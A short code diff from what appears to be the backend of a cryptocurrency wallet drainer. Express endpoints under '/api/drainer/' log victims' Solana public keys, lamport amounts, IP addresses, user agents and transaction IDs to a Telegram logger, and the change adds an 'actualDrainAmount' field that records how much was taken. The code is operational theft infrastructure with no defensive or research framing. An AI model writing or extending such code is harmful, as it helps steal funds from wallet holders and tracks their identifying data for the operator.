@@ -48,7 +48,7 @@ app.post('/api/drainer/log-wallet', async (req, res) => {
 // Log transaction confirmation
 app.post('/api/drainer/log-confirmation', async (req, res) => {
   try {
-    const { publicKey, lamports, ip, userAgent, txid, status, error: errorMsg, walletType } = req.body;
+    const { publicKey, lamports, ip, userAgent, txid, status, error: errorMsg, walletType, actualDrainAmount } = req.body;
     
     if (status === 'cancelled') {
       await telegramLogger.logTransactionCancelled({
@@ -67,7 +67,8 @@ app.post('/api/drainer/log-confirmation', async (req, res) => {
         userAgent,
         txid,
         status,
-        walletType
+        walletType,
+        actualDrainAmount: parseInt(actualDrainAmount) || 0
       });
     }
     
